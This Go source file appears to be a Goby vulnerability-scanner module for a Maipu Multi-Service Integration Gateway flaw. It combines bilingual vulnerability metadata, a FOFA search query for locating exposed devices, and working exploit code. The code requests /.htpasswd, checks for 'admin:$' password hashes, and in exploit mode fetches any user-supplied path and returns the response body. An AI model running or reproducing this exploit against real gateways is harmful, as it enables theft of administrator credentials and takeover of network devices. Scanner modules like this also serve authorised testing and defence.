package exploits

import (
	"errors"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Maipu Multi-Service Integration Gateway /.htpasswd Information Disclosure Vulnerability",
    "Description": "<p>The Maipu Multi-Service Integration Gateway is a high-performance network device. However, there is a vulnerability in its management interface, named /.htpasswd/ file disclosure. This vulnerability allows attackers to obtain the .htpasswd file of the device, thereby gaining access to administrator accounts and passwords, and ultimately controlling the entire network device.</p>",
    "Product": "Maipu Multi-Service Integration Gateway",
    "Homepage": "https://www.maipu.com/",
    "DisclosureDate": "2024-08-16",
    "PostTime": "2024-08-16",
    "Author": "maweixuan@baimaohui.net",
    "FofaQuery": "title=\"迈普多业务融合网关\" && body=\"js/config.js\"",
    "GobyQuery": "title=\"迈普多业务融合网关\" && body=\"js/config.js\"",
    "Level": "2",
    "Impact": "<p>This vulnerability may lead to the leakage of the administrator account and password of the Maipu Multi-Service Integration Gateway. Attackers can use this information to log in to the device and perform unauthorized operations, such as tampering with network configurations and stealing sensitive information, which seriously threatens the secure and stable operation of the network device.</p>",
    "Recommendation": "<p>To address this vulnerability, Maipu recommends users to upgrade the system version of the gateway device in a timely manner to ensure security. Additionally, strengthen the complexity of the administrator account and password, and regularly change passwords to reduce the risk of being cracked.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "info",
            "show": ""
        },
        {
            "name": "info",
            "type": "input",
            "value": "/.htpasswd",
            "show": "mode=info"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure",
        "HW-2024"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.8",
    "Translation": {
        "CN": {
            "Name": "迈普多业务融合网关 /.htpasswd 信息泄露漏洞",
            "Product": "迈普多业务融合网关",
            "Description": "<p>迈普多业务融合网关是一款高性能的网络设备，但在其管理界面中，存在一个名为 /.htpasswd/ 的文件泄露漏洞。该漏洞导致攻击者可以获取到设备的.htpasswd文件，从而获取管理员账号和密码，进而控制整个网络设备。<br></p>",
            "Recommendation": "<p>建议用户及时关注官方补丁。同时，加强管理员账号和密码的复杂度，定期更换密码，降低被破解的风险。<br></p>",
            "Impact": "<p>该漏洞可能导致迈普多业务融合网关的管理员账号和密码泄露，攻击者可利用这些信息登录设备，进行非法操作，如篡改网络配置、窃取敏感信息等，严重威胁网络设备的安全稳定运行。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "Maipu Multi-Service Integration Gateway /.htpasswd Information Disclosure Vulnerability",
            "Product": "Maipu Multi-Service Integration Gateway",
            "Description": "<p>The Maipu Multi-Service Integration Gateway is a high-performance network device. However, there is a vulnerability in its management interface, named /.htpasswd/ file disclosure. This vulnerability allows attackers to obtain the .htpasswd file of the device, thereby gaining access to administrator accounts and passwords, and ultimately controlling the entire network device.<br></p>",
            "Recommendation": "<p>To address this vulnerability, Maipu recommends users to upgrade the system version of the gateway device in a timely manner to ensure security. Additionally, strengthen the complexity of the administrator account and password, and regularly change passwords to reduce the risk of being cracked.<br></p>",
            "Impact": "<p>This vulnerability may lead to the leakage of the administrator account and password of the Maipu Multi-Service Integration Gateway. Attackers can use this information to log in to the device and perform unauthorized operations, such as tampering with network configurations and stealing sensitive information, which seriously threatens the secure and stable operation of the network device.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9933"
}`

	sendInitialPayload_KzRKfL := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		uri := `/.htpasswd`
		cfg := httpclient.NewGetRequestConfig(uri)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Timeout = 15

		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		if err != nil {
			return nil, err
		}
		if resp.StatusCode != 200 {
			return nil, errors.New("response status code is not 200")
		}
		if !strings.Contains(resp.Utf8Html, `admin:$`) {
			return nil, errors.New("not expected response")
		}
		return resp, nil
	}

	sendExploitPayload_OAsDXN := func(hostInfo *httpclient.FixUrl, info string) (*httpclient.HttpResponse, error) {
		uri := info
		cfg := httpclient.NewGetRequestConfig(uri)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Timeout = 15

		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		if err != nil {
			return nil, err
		}
		return resp, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			resp, err := sendInitialPayload_KzRKfL(hostInfo)
			if err != nil {
				return false
			}

			// 添加更多检查项
			if !strings.Contains(resp.Utf8Html, "admin:$") {
				return false
			}

			ss.VulURL = hostInfo.FixedHostInfo + `/.htpasswd`
			return true
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			info := goutils.B2S(stepLogs.Params["info"])

			resp, err := sendExploitPayload_OAsDXN(expResult.HostInfo, info)
			if err != nil {
				expResult.Output = `漏洞利用失败:` + err.Error()
				expResult.Success = false
				return expResult
			}
			if resp.StatusCode != 200 || !strings.Contains(resp.Utf8Html, `admin:$`) {
				expResult.Output = `漏洞利用失败: 未找到预期的响应`
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp.Utf8Html
			return expResult
		},
	))
}
